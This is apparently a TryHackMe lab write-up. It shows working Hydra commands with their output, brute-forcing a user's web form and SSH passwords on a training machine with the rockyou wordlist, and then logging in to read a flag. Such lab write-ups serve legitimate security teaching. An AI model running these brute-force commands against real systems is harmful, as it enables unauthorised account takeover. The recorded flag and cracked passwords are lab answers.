
# 0. Connect to the TryHackMe network using OpenVPN
To hack machines on TryHackMe you need to connect to our network.
You can connect through OpenVPN, or a Kali Linux machine controlled in your browser.

```sh
% ssh -i "sample-key.pem" kali@xxx.xxx.xxx.xxx
┌──(kali㉿kali)-[~]
└─$

┌──(kali㉿kali)-[~]
└─$ whoami
kali

┌──(kali㉿kali)-[~]
└─$ cd thm

┌──(kali㉿kali)-[~/thm]
└─$ sudo openvpn sample.ovpn
...
...
```

# 1. Use Hydra to bruteforce molly's web password. What is flag 1?
```sh
root@ip-10-10-153-102:~/thm# head /usr/share/wordlists/rockyou.txt
123456
12345
123456789
password
iloveyou
princess
1234567
rockyou
12345678
abc123
root@ip-10-10-153-102:~/thm# 
root@ip-10-10-153-102:~/thm# hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.52.126 http-post-form "/login:username=^USER^&password=^PASS^:Your username or password is incorrect"
Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (http://www.thc.org/thc-hydra) starting at 2022-09-10 22:21:51
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344398 login tries (l:1/p:14344398), ~896525 tries per task
[DATA] attacking http-post-form://10.10.52.126:80//login:username=^USER^&password=^PASS^:Your username or password is incorrect
[80][http-post-form] host: 10.10.52.126   login: molly   password: sunshine
1 of 1 target successfully completed, 1 valid password found
Hydra (http://www.thc.org/thc-hydra) finished at 2022-09-10 22:21:57
root@ip-10-10-153-102:~/thm# 
```

# 2. Use Hydra to bruteforce molly's SSH password. What is flag 2?
```sh
root@ip-10-10-153-102:~/thm# hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.52.126 ssh
Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (http://www.thc.org/thc-hydra) starting at 2022-09-10 22:25:31
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344398 login tries (l:1/p:14344398), ~896525 tries per task
[DATA] attacking ssh://10.10.52.126:22/
[22][ssh] host: 10.10.52.126   login: molly   password: butterfly
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 7 final worker threads did not complete until end.
[ERROR] 7 targets did not resolve or could not be connected
[ERROR] 16 targets did not complete
Hydra (http://www.thc.org/thc-hydra) finished at 2022-09-10 22:25:36
root@ip-10-10-153-102:~/thm# 
root@ip-10-10-153-102:~/thm# ssh molly@10.10.52.126
The authenticity of host '10.10.52.126 (10.10.52.126)' can't be established.
ECDSA key fingerprint is SHA256:XwoYQQDqwIoEGOQ9a3q+2htFqTqUHw7xaDP224rdlDk.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '10.10.52.126' (ECDSA) to the list of known hosts.
molly@10.10.52.126's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-1092-aws x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

65 packages can be updated.
32 updates are security updates.


Last login: Tue Dec 17 14:37:49 2019 from 10.8.11.98
molly@ip-10-10-52-126:~$ whoami
molly
molly@ip-10-10-52-126:~$ 
molly@ip-10-10-52-126:~$ pwd;ls -la
/home/molly
total 36
drwxr-xr-x 3 molly molly 4096 Dec 17  2019 .
drwxr-xr-x 4 root  root  4096 Dec 17  2019 ..
-rw------- 1 molly molly   42 Dec 17  2019 .bash_history
-rw-r--r-- 1 molly molly  220 Dec 17  2019 .bash_logout
-rw-r--r-- 1 molly molly 3771 Dec 17  2019 .bashrc
drwx------ 2 molly molly 4096 Dec 17  2019 .cache
-rw-rw-r-- 1 molly molly   38 Dec 17  2019 flag2.txt
-rw-r--r-- 1 molly molly  655 Dec 17  2019 .profile
-rw------- 1 molly molly  604 Dec 17  2019 .viminfo
molly@ip-10-10-52-126:~$ cat flag2.txt 
THM{c8eeb0468febbadea859baeb33b2541b}
molly@ip-10-10-52-126:~$ 
```